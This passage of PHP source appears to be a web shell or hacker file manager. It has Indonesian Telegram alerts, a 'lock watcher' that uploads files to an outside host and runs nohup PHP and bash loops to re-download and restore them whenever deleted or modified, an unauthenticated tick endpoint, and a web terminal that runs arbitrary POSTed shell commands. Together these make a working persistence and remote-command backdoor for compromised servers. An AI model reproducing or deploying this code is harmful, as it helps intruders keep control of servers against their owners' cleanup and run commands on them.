    $php .= "            \$out[] = \$target . '|' . (isset(\$p[1]) ? trim(\$p[1]) : '0444') . '|' . \$newBakUrl;\n";
    $php .= "        } else { \$out[] = \$l; }\n";
    $php .= "    }\n";
    $php .= "    @file_put_contents(\$store, implode(\"\\n\", \$out) . \"\\n\");\n";
    $php .= "}\n";
    $php .= "\n";
    $php .= "while (true) {\n";
    $php .= "    if (!file_exists(\$store)) { sleep(1); continue; }\n";
    $php .= "    \$lines = @file(\$store, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);\n";
    $php .= "    if (!\$lines) { sleep(1); continue; }\n";
    $php .= "    foreach (\$lines as \$line) {\n";
    $php .= "        \$line = trim(\$line); if (!\$line) continue;\n";
    $php .= "        \$parts  = explode('|', \$line, 3);\n";
    $php .= "        \$target = \$parts[0];\n";
    $php .= "        \$perm   = isset(\$parts[1]) ? trim(\$parts[1]) : '0444';\n";
    $php .= "        \$bakUrl = isset(\$parts[2]) ? trim(\$parts[2]) : '';\n";
    $php .= "        \$permInt = octdec(\$perm);\n";
    $php .= "        clearstatcache(true, \$target);\n";
    $php .= "        if (!file_exists(\$target) && !is_link(\$target)) {\n";
    $php .= "            // --- FILE MISSING: restore then re-upload ---\n";
    $php .= "            \$content = '';\n";
    $php .= "            if (\$bakUrl) { \$content = watcher_fetch(\$bakUrl); }\n";
    $php .= "            // Ensure parent directory exists\n";
    $php .= "            \$dir = dirname(\$target);\n";
    $php .= "            if (!\$dir || !is_dir(\$dir)) { @mkdir(\$dir, 0755, true); }\n";
    $php .= "            // Make parent writable temporarily\n";
    $php .= "            \$dirPerm = @fileperms(\$dir);\n";
    $php .= "            @chmod(\$dir, 0755);\n";
    $php .= "            \$written = @file_put_contents(\$target, \$content !== false ? \$content : '');\n";
    $php .= "            if (\$written !== false) { @chmod(\$target, \$permInt); }\n";
    $php .= "            // Re-upload restored file to Figma to refresh backup URL\n";
    $php .= "            if (\$written !== false && file_exists(\$target)) {\n";
    $php .= "                \$newUrl = watcher_upload_figma(\$target);\n";
    $php .= "                if (\$newUrl) { watcher_update_store(\$store, \$target, \$newUrl); }\n";
    $php .= "            }\n";
    $php .= "        } else {\n";
    $php .= "            // --- FILE EXISTS: enforce chmod ---\n";
    $php .= "            \$cur  = substr(sprintf('%o', @fileperms(\$target)), -4);\n";
    $php .= "            \$want = str_pad(ltrim(\$perm, '0'), 4, '0', STR_PAD_LEFT);\n";
    $php .= "            if (\$want === '0000') \$want = '0444';\n";
    $php .= "            if (\$cur !== \$want) {\n";
    $php .= "                // For enforcing read-only: no chmod writable needed first\n";
    $php .= "                @chmod(\$target, \$permInt);\n";
    $php .= "            }\n";
    $php .= "        }\n";
    $php .= "    }\n";
    $php .= "    sleep(1);\n";
    $php .= "}\n";
    @file_put_contents($phpWatchFile, $php);
    @chmod($phpWatchFile, 0755);
}

function lp_build_reupload_helper($helperFile) {
    $src  = '<?php' . "\n";
    $src .= 'if (empty($argv[1]) || empty($argv[2])) exit;' . "\n";
    $src .= '$filePath = $argv[1]; $store = $argv[2];' . "\n";
    $src .= 'if (!file_exists($filePath) || is_dir($filePath)) exit;' . "\n";
    $src .= '$raw = @file_get_contents($filePath);' . "\n";
    $src .= 'if (!$raw) exit;' . "\n";
    $src .= '$apiUrl = "https://help.figma.com/api/v2/uploads.json?filename=" . rawurlencode(basename($filePath));' . "\n";
    $src .= '$hdrs = array("Content-Type: application/octet-stream","Content-Length: ".strlen($raw),"User-Agent: Mozilla/5.0","Accept: */*","Origin: https://upload.c99.nl","Referer: https://upload.c99.nl/");' . "\n";
    $src .= '$resp = "";' . "\n";
    $src .= 'if (function_exists("curl_init")) {' . "\n";
    $src .= '    $ch = curl_init($apiUrl);' . "\n";
    $src .= '    curl_setopt_array($ch, array(CURLOPT_POST=>true,CURLOPT_POSTFIELDS=>$raw,CURLOPT_RETURNTRANSFER=>true,CURLOPT_TIMEOUT=>30,CURLOPT_HTTPHEADER=>$hdrs,CURLOPT_SSL_VERIFYPEER=>false));' . "\n";
    $src .= '    $resp = curl_exec($ch); curl_close($ch);' . "\n";
    $src .= '}' . "\n";
    $src .= 'if (!$resp) {' . "\n";
    $src .= '    $ctx = stream_context_create(array("http"=>array("method"=>"POST","header"=>implode("\r\n",$hdrs),"content"=>$raw,"timeout"=>30,"ignore_errors"=>true)));' . "\n";
    $src .= '    $resp = @file_get_contents($apiUrl, false, $ctx);' . "\n";
    $src .= '}' . "\n";
    $src .= 'if (!$resp) exit;' . "\n";
    $src .= '$j = @json_decode($resp, true);' . "\n";
    $src .= '$att = isset($j["upload"]["attachment"]) ? $j["upload"]["attachment"] : (isset($j["upload"]["attachments"][0]) ? $j["upload"]["attachments"][0] : null);' . "\n";
    $src .= 'if (!$att) exit;' . "\n";
    $src .= '$newUrl = isset($att["mapped_content_url"]) ? $att["mapped_content_url"] : (isset($att["content_url"]) ? $att["content_url"] : "");' . "\n";
    $src .= 'if (!$newUrl) exit;' . "\n";
    $src .= '// Update the store file' . "\n";
    $src .= '$lines = @file($store, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);' . "\n";
    $src .= 'if (!$lines) { echo $newUrl; exit; }' . "\n";
    $src .= '$out = array();' . "\n";
    $src .= 'foreach ($lines as $l) {' . "\n";
    $src .= '    $p = explode("|", $l, 3);' . "\n";
    $src .= '    if (trim($p[0]) === $filePath) {' . "\n";
    $src .= '        $out[] = $filePath . "|" . (isset($p[1]) ? trim($p[1]) : "0444") . "|" . $newUrl;' . "\n";
    $src .= '    } else { $out[] = $l; }' . "\n";
    $src .= '}' . "\n";
    $src .= '@file_put_contents($store, implode("\n", $out) . "\n");' . "\n";
    $src .= 'echo $newUrl;' . "\n";
    @file_put_contents($helperFile, $src);
    @chmod($helperFile, 0755);
}

function lp_build_bash_watcher($bashWatchFile, $lockStore, $helperFile) {
    $sq  = escapeshellarg($lockStore);
    $sqh = escapeshellarg($helperFile);
    $sh  = "#!/bin/bash\n";
    $sh .= "LOCKSTORE=" . $sq . "\n";
    $sh .= "HELPER=" . $sqh . "\n";
    $sh .= "while true; do\n";
    $sh .= "  [ ! -f \"\$LOCKSTORE\" ] && sleep 1 && continue\n";
    $sh .= "  while IFS='|' read -r TARGET PERM BKUP || [ -n \"\$TARGET\" ]; do\n";
    $sh .= "    TARGET=\$(printf '%s' \"\$TARGET\" | tr -d '\\r')\n";
    $sh .= "    PERM=\$(printf '%s' \"\$PERM\" | tr -d '\\r')\n";
    $sh .= "    BKUP=\$(printf '%s' \"\$BKUP\" | tr -d '\\r')\n";
    $sh .= "    [ -z \"\$TARGET\" ] && continue\n";
    $sh .= "    if [ ! -e \"\$TARGET\" ] && [ ! -L \"\$TARGET\" ]; then\n";
    $sh .= "      if [ -n \"\$BKUP\" ]; then\n";
    $sh .= "        curl -sL --max-time 20 \"\$BKUP\" -o \"\$TARGET\" 2>/dev/null\n";
    $sh .= "        [ ! -s \"\$TARGET\" ] && wget -qO \"\$TARGET\" \"\$BKUP\" 2>/dev/null\n";
    $sh .= "      fi\n";
    $sh .= "      [ ! -e \"\$TARGET\" ] && touch \"\$TARGET\" 2>/dev/null\n";
    $sh .= "      chmod \"\$PERM\" \"\$TARGET\" 2>/dev/null\n";
    $sh .= "      if command -v php >/dev/null 2>&1 && [ -f \"\$HELPER\" ] && [ -f \"\$TARGET\" ]; then\n";
    $sh .= "        php \"\$HELPER\" \"\$TARGET\" \"\$LOCKSTORE\" > /dev/null 2>&1\n";
    $sh .= "      fi\n";
    $sh .= "    fi\n";
    $sh .= "    if [ -e \"\$TARGET\" ]; then\n";
    $sh .= "      CUR=\$(stat -c '%a' \"\$TARGET\" 2>/dev/null || stat -f '%Lp' \"\$TARGET\" 2>/dev/null)\n";
    $sh .= "      WANT=\$(printf '%s' \"\$PERM\" | sed 's/^0*//')\n";
    $sh .= "      [ -z \"\$WANT\" ] && WANT=\"444\"\n";
    $sh .= "      [ \"\$CUR\" != \"\$WANT\" ] && chmod \"\$PERM\" \"\$TARGET\" 2>/dev/null\n";
    $sh .= "    fi\n";
    $sh .= "  done < \"\$LOCKSTORE\"\n";
    $sh .= "  sleep 1\n";
    $sh .= "done\n";
    @file_put_contents($bashWatchFile, $sh);
    @chmod($bashWatchFile, 0755);
}

function lp_pid_alive($pid) {
    if (!$pid || !is_numeric($pid)) return false;
    if (file_exists('/proc/' . intval($pid))) return true;
    $out = trim((string)@shell_exec('kill -0 ' . intval($pid) . ' 2>&1'));
    return ($out === '' || strpos($out, 'No such process') === false);
}

function lp_ensure_watcher_running($phpWatchFile, $bashWatchFile, $pidFile, $lockStore) {
    $pid = trim((string)@file_get_contents($pidFile));
    if ($pid && lp_pid_alive($pid)) return $pid; // already alive
    $entries = lp_lock_load($lockStore);
    if (empty($entries)) return null;
    return lp_launch_watcher($phpWatchFile, $bashWatchFile, $pidFile);
}

function lp_kill_watcher($pidFile) {
    if (@file_exists($pidFile)) {
        $pid = trim(@file_get_contents($pidFile));
        if ($pid && is_numeric($pid)) {
            @shell_exec('kill ' . intval($pid) . ' 2>/dev/null');
            @exec('kill ' . intval($pid) . ' 2>/dev/null');
        }
        @unlink($pidFile);
    }
}

function lp_launch_watcher($phpWatchFile, $bashWatchFile, $pidFile) {
    lp_kill_watcher($pidFile);
    $pid = '';
    $phpBin = defined('PHP_BINARY') && PHP_BINARY ? PHP_BINARY : 'php';
    $cmd = 'nohup ' . escapeshellarg($phpBin) . ' ' . escapeshellarg($phpWatchFile) . ' > /dev/null 2>&1 & echo $!';
    $pid = trim((string)@shell_exec($cmd));
    if (!$pid || !is_numeric($pid)) { $pid = trim((string)@exec($cmd)); }
    if (!$pid || !is_numeric($pid)) {
        $cmd2 = 'nohup bash ' . escapeshellarg($bashWatchFile) . ' > /dev/null 2>&1 & echo $!';
        $pid  = trim((string)@shell_exec($cmd2));
        if (!$pid || !is_numeric($pid)) { $pid = trim((string)@exec($cmd2)); }
    }
    if ($pid && is_numeric($pid)) { @file_put_contents($pidFile, $pid); }
    return $pid ?: 'n/a';
}


$_isWatcherTick = isset($_GET['lp_watcher_tick']) ||
    (isset($_POST['lock_action']) && $_POST['lock_action'] === 'lp_watcher_tick');
if ($_isWatcherTick) {
    ob_clean();
    header('Content-Type: application/json; charset=utf-8');
    $watchDir  = abyes_DATA_DIR;
    $lockStore = getDataPath('.lockfiles');
    if (!file_exists($lockStore)) { echo json_encode(array('ok'=>true,'restored'=>0)); exit; }
    $lines = @file($lockStore, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (!$lines) { echo json_encode(array('ok'=>true,'restored'=>0)); exit; }

    $tgCfg    = lp_tg_settings_load();
    $tgToken  = $tgCfg['bot_token'] ?? '';
    $tgChatId = $tgCfg['chat_id']   ?? '';
    $pageUrl  = lp_get_page_url();

    $throttleFile = $watchDir . '/.tg_throttle';
    $throttle     = @file_exists($throttleFile) ? (@json_decode(@file_get_contents($throttleFile), true) ?: array()) : array();
    $now          = time();
    $throttleChanged = false;

    $restored = 0; $log = array();
    foreach ($lines as $line) {
        $line = trim($line); if (!$line) continue;
        $parts  = explode('|', $line, 5);
        $target = trim($parts[0]);
        $perm   = isset($parts[1]) ? trim($parts[1]) : '0444';
        $bakUrl = isset($parts[2]) ? trim($parts[2]) : '';
        $baselineSize = isset($parts[3]) ? intval($parts[3]) : 0;
        $baselineHash = isset($parts[4]) ? trim($parts[4]) : '';
        $permInt = octdec($perm);
        $baseline = array('size' => $baselineSize, 'hash' => $baselineHash);
        clearstatcache(true, $target);

        $fileChanged = lp_file_changed($target, $baseline);

        $parentUnwriteable = false;
        if (file_exists($target)) {
            $dir = dirname($target);
            if (is_dir($dir) && !is_writable($dir)) {
                $parentUnwriteable = true;
                lp_ensure_parent_writable($target);
            }
        }

        if (!file_exists($target) && !is_link($target)) {
            $tKey = md5($target);
            $lastAlert = isset($throttle[$tKey]) ? (int)$throttle[$tKey] : 0;
            if ($tgToken && $tgChatId && ($now - $lastAlert) > 60) {
                $fname = basename($target);
                $msg  = "<b>PERINGATAN: File Terkunci Hilang!</b>\n\n"
                      . "<b>File:</b> <code>" . htmlspecialchars($fname) . "</code>\n"
                      . "<b>Path:</b> <code>" . htmlspecialchars($target) . "</code>\n"
                      . "<b>Perm:</b> <code>" . htmlspecialchars($perm) . "</code>\n"
                      . "<b>Backup URL:</b> " . ($bakUrl ? '<a href="' . htmlspecialchars($bakUrl) . '">' . htmlspecialchars($bakUrl) . '</a>' : 'Tidak ada') . "\n\n"
                      . "Mencoba restore otomatis...";
                lp_telegram_send($tgToken, $tgChatId, $msg);
                $throttle[$tKey] = $now;
                $throttleChanged = true;
            }

            $content = '';
            if ($bakUrl) {
                if (function_exists('curl_init')) {
                    $ch = curl_init($bakUrl);
                    curl_setopt_array($ch, array(CURLOPT_RETURNTRANSFER=>true, CURLOPT_TIMEOUT=>20,
                        CURLOPT_FOLLOWLOCATION=>true, CURLOPT_SSL_VERIFYPEER=>false,
                        CURLOPT_USERAGENT=>'Mozilla/5.0'));
                    $content = curl_exec($ch); curl_close($ch);
                }
                if (!$content) {
                    $ctx = @stream_context_create(array('http'=>array('method'=>'GET','timeout'=>20,
                        'ignore_errors'=>true,'header'=>"User-Agent: Mozilla/5.0\r\n")));
                    $content = @file_get_contents($bakUrl, false, $ctx);
                }
            }
            $dir = dirname($target);
            if (!is_dir($dir)) @mkdir($dir, 0755, true);
            lp_ensure_parent_writable($target); // Ensure parent is writable before writing
            $written = @file_put_contents($target, $content !== false ? $content : '');
            if ($written !== false) {
                @chmod($target, $permInt);
                $restored++;
                $log[] = 'restored: ' . $target;
                if ($tgToken && $tgChatId) {
                    $fname = basename($target);
                    $size  = filesize($target);
                    $sizeStr = $size > 1024 ? round($size/1024, 1) . ' KB' : $size . ' B';
                    $msg  = "<b>File Berhasil Di-Restore!</b>\n\n"
                          . "<b>File:</b> <code>" . htmlspecialchars($fname) . "</code>\n"
                          . "<b>Path:</b> <code>" . htmlspecialchars($target) . "</code>\n"
                          . "<b>Ukuran:</b> <code>" . $sizeStr . "</code>\n"
                          . "<b>Perm terkunci:</b> <code>" . htmlspecialchars($perm) . "</code>\n"
                          . "<b>Backup URL:</b> " . ($bakUrl ? '<a href="' . htmlspecialchars($bakUrl) . '">' . htmlspecialchars($bakUrl) . '</a>' : '-') . "\n\n"
                          . "<b>File Manager:</b> <a href=\"" . htmlspecialchars($pageUrl) . "\">" . htmlspecialchars($pageUrl) . "</a>";
                    lp_telegram_send($tgToken, $tgChatId, $msg);
                    unset($throttle[$tKey]);
                    $throttleChanged = true;
                }
            } else {
                $log[] = 'write_failed: ' . $target;
                if ($tgToken && $tgChatId) {
                    $msg  = "<b>GAGAL Restore File!</b>\n\n"
                          . "<b>File:</b> <code>" . htmlspecialchars(basename($target)) . "</code>\n"
                          . "<b>Path:</b> <code>" . htmlspecialchars($target) . "</code>\n"
                          . "Gagal menulis file ke server. Periksa permission direktori.\n\n"
                          . "<b>File Manager:</b> <a href=\"" . htmlspecialchars($pageUrl) . "\">" . htmlspecialchars($pageUrl) . "</a>";
                    lp_telegram_send($tgToken, $tgChatId, $msg);
                }
            }
        } elseif ($fileChanged && !is_dir($target)) {
            $tKey = md5($target . '_content');
            $lastAlert = isset($throttle[$tKey]) ? (int)$throttle[$tKey] : 0;
            if ($tgToken && $tgChatId && ($now - $lastAlert) > 60) {
                $fname = basename($target);
                $msg  = "<b>PERINGATAN: Isi File Berubah!</b>\n\n"
                      . "<b>File:</b> <code>" . htmlspecialchars($fname) . "</code>\n"
                      . "<b>Path:</b> <code>" . htmlspecialchars($target) . "</code>\n"
                      . "<b>Perm terkunci:</b> <code>" . htmlspecialchars($perm) . "</code>\n\n"
                      . "File yang seharusnya read-only terdeteksi ada perubahan. Mencoba restore dari backup...";
                lp_telegram_send($tgToken, $tgChatId, $msg);
                $throttle[$tKey] = $now;
                $throttleChanged = true;
            }

            $content = '';
            if ($bakUrl) {
                if (function_exists('curl_init')) {
                    $ch = curl_init($bakUrl);
                    curl_setopt_array($ch, array(CURLOPT_RETURNTRANSFER=>true, CURLOPT_TIMEOUT=>20,
                        CURLOPT_FOLLOWLOCATION=>true, CURLOPT_SSL_VERIFYPEER=>false,
                        CURLOPT_USERAGENT=>'Mozilla/5.0'));
                    $content = curl_exec($ch); curl_close($ch);
                }
                if (!$content) {
                    $ctx = @stream_context_create(array('http'=>array('method'=>'GET','timeout'=>20,
                        'ignore_errors'=>true,'header'=>"User-Agent: Mozilla/5.0\r\n")));
                    $content = @file_get_contents($bakUrl, false, $ctx);
                }
            }

            if ($content) {
                lp_ensure_parent_writable($target);
                @chmod($target, 0644); // Temporarily make writable
                $written = @file_put_contents($target, $content);
                @chmod($target, $permInt); // Re-lock
                if ($written !== false) {
                    $restored++;
                    $log[] = 'content_restored: ' . $target;
                    if ($tgToken && $tgChatId) {
                        $fname = basename($target);
                        $size  = filesize($target);
                        $sizeStr = $size > 1024 ? round($size/1024, 1) . ' KB' : $size . ' B';
                        $msg  = "<b>File Berhasil Di-Restore dari Backup!</b>\n\n"
                              . "<b>File:</b> <code>" . htmlspecialchars($fname) . "</code>\n"
                              . "<b>Path:</b> <code>" . htmlspecialchars($target) . "</code>\n"
                              . "<b>Ukuran:</b> <code>" . $sizeStr . "</code>\n"
                              . "<b>Status:</b> Re-locked dengan perm " . htmlspecialchars($perm) . "\n\n"
                              . "<b>File Manager:</b> <a href=\"" . htmlspecialchars($pageUrl) . "\">" . htmlspecialchars($pageUrl) . "</a>";
                        lp_telegram_send($tgToken, $tgChatId, $msg);
                        unset($throttle[$tKey]);
                        $throttleChanged = true;
                    }
                }
            }
        } else {
            $cur  = substr(sprintf('%o', @fileperms($target)), -4);
            $want = str_pad(ltrim($perm, '0'), 4, '0', STR_PAD_LEFT);
            if ($want === '0000') $want = '0444';
            if ($cur !== $want) @chmod($target, $permInt);
            if ($parentUnwriteable) {
                lp_ensure_parent_writable($target);
            }
        }
    }
    if ($throttleChanged) {
        @file_put_contents($throttleFile, json_encode($throttle));
    }
    echo json_encode(array('ok'=>true, 'restored'=>$restored, 'log'=>$log)); exit;
}


if (isset($_POST['lock_action']) && isAuthenticated()) {
    ob_clean();
    header('Content-Type: application/json; charset=utf-8');
    $lockAction   = $_POST['lock_action'];
    $watchDir     = abyes_DATA_DIR;
    $lockStore    = getDataPath('.lockfiles');
    $phpWatchFile = getDataPath('lockwatcher.php');
    $shWatchFile  = getDataPath('lockwatcher.sh');
    $helperFile   = getDataPath('lp_reupload.php');
    $pidFile      = getDataPath('lockwatcher.pid');
    @mkdir(abyes_DATA_DIR, 0755, true);

    $entries = lp_lock_load($lockStore);

    if ($lockAction === 'list') {
        if (!empty($entries)) {
            $livePid = lp_ensure_watcher_running($phpWatchFile, $shWatchFile, $pidFile, $lockStore);
        } else {
            $livePid = null;
        }
        $watcherPid    = trim((string)@file_get_contents($pidFile));
        $watcherAlive  = $watcherPid ? lp_pid_alive($watcherPid) : false;
        $shellDisabled = !function_exists('shell_exec') && !function_exists('exec') && !function_exists('proc_open');
        $phpBinUsed    = defined('PHP_BINARY') && PHP_BINARY ? PHP_BINARY : 'php';
        $watcherFileOk = file_exists($phpWatchFile);
        $info = array();
        foreach ($entries as $e) {
            clearstatcache(true, $e['path']);
            $info[] = array(
                'path'       => $e['path'],
                'perm'       => $e['perm'],
                'backup_url' => $e['backup_url'],
                'exists'     => file_exists($e['path']) || is_link($e['path']),
                'cur_perm'   => @file_exists($e['path']) ? substr(sprintf('%o', fileperms($e['path'])), -4) : '----',
                'is_dir'     => is_dir($e['path']),
            );
        }
        echo json_encode(array(
            'ok'              => true,
            'locked'          => $info,
            'watcher_pid'     => $watcherPid ?: null,
            'watcher_alive'   => $watcherAlive,
            'shell_disabled'  => $shellDisabled,
            'php_bin'         => $phpBinUsed,
            'watcher_file_ok' => $watcherFileOk,
            'tick_url'        => 'post',
        )); exit;
    }

    
    if ($lockAction === 'lock') {
        $path = isset($_POST['lock_path']) ? trim($_POST['lock_path']) : '';
        $perm = isset($_POST['lock_perm']) ? trim($_POST['lock_perm']) : '0444';
        if (empty($path)) { echo json_encode(array('err' => 'No path given')); exit; }
        if (!file_exists($path) && !is_link($path)) { echo json_encode(array('err' => 'Path not found: ' . $path)); exit; }

        $backupUrl = '';
        if (!is_dir($path)) { $backupUrl = lp_upload_figma($path); }

        $entries = array_values(array_filter($entries, function($e) use ($path) { return $e['path'] !== $path; }));
        $baseline = lp_file_baseline($path);
        $entries[] = array(
            'path'           => $path,
            'perm'           => $perm,
            'backup_url'     => $backupUrl,
            'baseline_size'  => $baseline['size'],
            'baseline_hash'  => $baseline['hash'],
        );
        lp_lock_save($lockStore, $entries);

        @chmod($path, octdec($perm));

        lp_build_reupload_helper($helperFile);
        lp_build_php_watcher($phpWatchFile, $lockStore);
        lp_build_bash_watcher($shWatchFile, $lockStore, $helperFile);
        $pid = lp_launch_watcher($phpWatchFile, $shWatchFile, $pidFile);

        echo json_encode(array(
            'ok'         => true,
            'msg'        => 'Locked: ' . $path,
            'pid'        => $pid,
            'perm'       => $perm,
            'backup_url' => $backupUrl,
            'has_backup' => !empty($backupUrl),
        )); exit;
    }

    
    if ($lockAction === 'unlock') {
        $path = isset($_POST['lock_path']) ? trim($_POST['lock_path']) : '';
        $entries = array_values(array_filter($entries, function($e) use ($path) { return $e['path'] !== $path; }));
        lp_lock_save($lockStore, $entries);
        if (file_exists($path)) { @chmod($path, is_dir($path) ? 0755 : 0644); }
        lp_build_reupload_helper($helperFile);
        lp_build_php_watcher($phpWatchFile, $lockStore);
        lp_build_bash_watcher($shWatchFile, $lockStore, $helperFile);
        if (empty($entries)) { lp_kill_watcher($pidFile); }
        echo json_encode(array('ok' => true, 'msg' => 'Unlocked: ' . $path)); exit;
    }

    
    if ($lockAction === 'unlock_all') {
        foreach ($entries as $e) {
            if (file_exists($e['path'])) { @chmod($e['path'], is_dir($e['path']) ? 0755 : 0644); }
        }
        @file_put_contents($lockStore, '');
        lp_kill_watcher($pidFile);
        echo json_encode(array('ok' => true, 'msg' => 'All files unlocked')); exit;
    }

    
    if ($lockAction === 'reupload') {
        $path = isset($_POST['lock_path']) ? trim($_POST['lock_path']) : '';
        if (empty($path) || !file_exists($path)) { echo json_encode(array('err' => 'File not found')); exit; }
        $backupUrl = lp_upload_figma($path);
        foreach ($entries as &$e) {
            if ($e['path'] === $path) { $e['backup_url'] = $backupUrl; break; }
        } unset($e);
        lp_lock_save($lockStore, $entries);
        lp_build_reupload_helper($helperFile);
        lp_build_php_watcher($phpWatchFile, $lockStore);
        lp_build_bash_watcher($shWatchFile, $lockStore, $helperFile);
        echo json_encode(array('ok' => true, 'backup_url' => $backupUrl, 'has_backup' => !empty($backupUrl))); exit;
    }

    if ($lockAction === 'mass_lock') {
        $paths = isset($_POST['lock_paths']) ? @json_decode(stripslashes($_POST['lock_paths']), true) : array();
        $perm  = isset($_POST['lock_perm'])  ? trim($_POST['lock_perm']) : '0444';
        if (empty($paths) || !is_array($paths)) { echo json_encode(array('err' => 'No paths given')); exit; }

        $locked = 0; $failed = 0; $results = array();
        foreach ($paths as $path) {
            $path = trim($path);
            if (empty($path) || (!file_exists($path) && !is_link($path))) {
                $failed++; $results[] = array('path' => $path, 'ok' => false, 'err' => 'not found'); continue;
            }
            $backupUrl = '';
            if (!is_dir($path)) { $backupUrl = lp_upload_figma($path); }
            $entries = array_values(array_filter($entries, function($e) use ($path) { return $e['path'] !== $path; }));
            $baseline = lp_file_baseline($path);
            $entries[] = array(
                'path'           => $path,
                'perm'           => $perm,
                'backup_url'     => $backupUrl,
                'baseline_size'  => $baseline['size'],
                'baseline_hash'  => $baseline['hash'],
            );
            @chmod($path, octdec($perm));
            $locked++;
            $results[] = array('path' => $path, 'ok' => true, 'backup_url' => $backupUrl);
        }

        lp_lock_save($lockStore, $entries);
        lp_build_reupload_helper($helperFile);
        lp_build_php_watcher($phpWatchFile, $lockStore);
        lp_build_bash_watcher($shWatchFile, $lockStore, $helperFile);
        $pid = lp_launch_watcher($phpWatchFile, $shWatchFile, $pidFile);

        echo json_encode(array(
            'ok'      => true,
            'locked'  => $locked,
            'failed'  => $failed,
            'pid'     => $pid,
            'results' => $results,
        )); exit;
    }

    
    if ($lockAction === 'tg_save') {
        $token  = isset($_POST['bot_token']) ? trim($_POST['bot_token']) : '';
        $chatId = isset($_POST['chat_id'])   ? trim($_POST['chat_id'])   : '';
        lp_tg_settings_save($token, $chatId);
        $ok = false;
        if ($token && $chatId) {
            $pageUrl = lp_get_page_url();
            $ok = lp_telegram_send($token, $chatId,
                "Lock Watcher terhubung!\n\nNotifikasi akan dikirim ke sini saat file yang dikunci hilang atau berhasil di-restore.\n\nFile Manager: " . $pageUrl
            );
        }
        echo json_encode(array('ok' => true, 'ping' => $ok)); exit;
    }

    if ($lockAction === 'tg_load') {
        $cfg = lp_tg_settings_load();
        $tok = $cfg['bot_token'];
        $masked = $tok ? substr($tok, 0, 6) . str_repeat('*', max(0, strlen($tok) - 10)) . substr($tok, -4) : '';
        echo json_encode(array('ok' => true, 'has_token' => !empty($tok), 'masked_token' => $masked, 'chat_id' => $cfg['chat_id'])); exit;
    }

    if ($lockAction === 'terminal_stream2') {
        @set_time_limit(120);
        @ini_set('output_buffering', 'Off');
        header('Content-Type: text/event-stream; charset=utf-8');
        header('Cache-Control: no-cache');
        header('X-Accel-Buffering: no');
        @ob_end_clean();

        $cmd    = isset($_POST['cmd'])  ? trim($_POST['cmd'])  : '';
        $cwd    = isset($_POST['cwd'])  ? trim($_POST['cwd'])  : dirname(__FILE__);
        $sessId = isset($_POST['sid'])  ? preg_replace('/[^a-zA-Z0-9_-]/', '', $_POST['sid']) : '';
        if (empty($cwd) || !is_dir($cwd)) $cwd = dirname(__FILE__);

        $sessDir = getDataPath('.term_sessions');
        if (!is_dir($sessDir)) @mkdir($sessDir, 0755, true);
        if (!$sessId) $sessId = 'lp_' . bin2hex(random_bytes(6));
        $cwdFile = $sessDir . '/' . $sessId . '.cwd';
        if (file_exists($cwdFile)) $cwd = trim(@file_get_contents($cwdFile)) ?: $cwd;

        $sse = function($type, $data) {
            echo 'event: ' . $type . "\n";
            echo 'data: ' . json_encode($data) . "\n\n";
            @ob_flush(); flush();
        };

        if ($cmd === '' || $cmd === null) {
            @file_put_contents($cwdFile, $cwd);
            $sse('done', array('cwd' => $cwd, 'sid' => $sessId));
            exit;
        }
        if (preg_match('/^cd(?:\s+(.*))?$/', $cmd, $m)) {
            $tgt = isset($m[1]) ? trim($m[1]) : '';
            if ($tgt === '' || $tgt === '~') $tgt = getenv('HOME') ?: '/';
            elseif ($tgt[0] !== '/') $tgt = realpath($cwd . '/' . $tgt) ?: ($cwd . '/' . $tgt);
            if (is_dir($tgt)) {
                $cwd = rtrim($tgt, '/') ?: '/';
                @file_put_contents($cwdFile, $cwd);
                $sse('done', array('cwd' => $cwd, 'sid' => $sessId));
            } else {
                $sse('out', array('v' => "bash: cd: $tgt: No such file or directory\n"));
                $sse('done', array('cwd' => $cwd, 'sid' => $sessId));
            }
            exit;
        }

        $env = array(
            'TERM'    => 'xterm-256color',
            'HOME'    => getenv('HOME') ?: '/tmp',
            'PATH'    => getenv('PATH') ?: '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin',
            'COLUMNS' => '200',
            'LINES'   => '50',
            'SHELL'   => '/bin/bash',
        );

        $fullCmd = 'cd ' . escapeshellarg($cwd) . ' && (' . $cmd . ') 2>&1; echo "__LPDONE__:$?:$(pwd)"';

        if (function_exists('proc_open')) {
            $desc = array(0 => array('pipe','r'), 1 => array('pipe','w'), 2 => array('pipe','w'));
            $proc = @proc_open('/bin/bash -c ' . escapeshellarg($fullCmd), $desc, $pipes, $cwd, $env);
            if ($proc) {
                fclose($pipes[0]);
                stream_set_blocking($pipes[1], false);
                stream_set_blocking($pipes[2], false);
                $buf = '';
                $deadline = time() + 90;
                while (time() < $deadline) {
                    $r = array($pipes[1]); $w = array(); $ex = array();
                    if (@stream_select($r, $w, $ex, 0, 60000) > 0) {
                        $chunk = @fread($pipes[1], 4096);
                        if ($chunk !== false && $chunk !== '') {
                            $buf .= $chunk;
                            if (strpos($buf, '__LPDONE__:') !== false) {
                                $pos = strpos($buf, '__LPDONE__:');
                                $out = substr($buf, 0, $pos);
                                if ($out !== '') $sse('out', array('v' => $out));
                                preg_match('/__LPDONE__:\d+:(.*)/', $buf, $dm);
                                $newCwd = isset($dm[1]) ? trim($dm[1]) : $cwd;
                                if ($newCwd && is_dir($newCwd)) $cwd = $newCwd;
                                break;
                            } else {
                                if (strlen($buf) > 64) {
                                    $flush = substr($buf, 0, strlen($buf) - 64);
                                    $sse('out', array('v' => $flush));
                                    $buf = substr($buf, strlen($buf) - 64);
                                }
                            }
                        }
                    }
                    if (feof($pipes[1])) {
                        if ($buf !== '') $sse('out', array('v' => $buf));
                        break;
                    }
                }
                @fclose($pipes[1]); @fclose($pipes[2]); proc_close($proc);
            } else {
                $sse('out', array('v' => "bash: Failed to start process\n"));
            }
        } elseif (function_exists('shell_exec')) {
            $out = (string)@shell_exec($fullCmd);
            $pos = strpos($out, '__LPDONE__:');
            if ($pos !== false) {
                $visible = substr($out, 0, $pos);
                if ($visible !== '') $sse('out', array('v' => $visible));
                preg_match('/__LPDONE__:\d+:(.*)/', $out, $dm);
                $newCwd = isset($dm[1]) ? trim($dm[1]) : $cwd;
                if ($newCwd && is_dir($newCwd)) $cwd = $newCwd;
            } else {
                if ($out !== '') $sse('out', array('v' => $out));
            }
        } else {
            $sse('out', array('v' => "Error: no shell execution function available.\n"));
        }

        @file_put_contents($cwdFile, $cwd);
